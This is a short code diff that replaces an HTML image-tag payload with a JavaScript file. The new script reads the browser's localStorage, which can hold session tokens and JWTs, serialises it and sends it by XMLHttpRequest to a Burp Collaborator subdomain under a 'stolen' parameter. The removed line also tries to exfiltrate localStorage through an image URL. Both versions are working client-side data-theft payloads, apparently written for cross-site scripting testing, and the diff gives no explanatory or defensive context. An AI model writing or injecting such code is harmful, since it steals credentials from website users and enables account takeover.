@@ -1,1 +1,14 @@
-<html><img src="https://4indrkqxck3juw34q6z6hyxsojubi0.burpcollaborator.net/yikes?jwt="+JSON.stringify(localStorage);’--!></html>
+var theUrl = ("http://qkezt6sje655wi5qss1sjkzeq5wykn.burpcollaborator.net?stolen=+" + JSON.stringify(localStorage))
+function httpGetAsync(theUrl, callback)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.onreadystatechange = function() {
+        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
+            callback(xmlHttp.responseText);
+    }
+    xmlHttp.open("GET", theUrl, true); // true for asynchronous
+    xmlHttp.send(null);
+}
+
+
+httpGetAsync(theUrl);
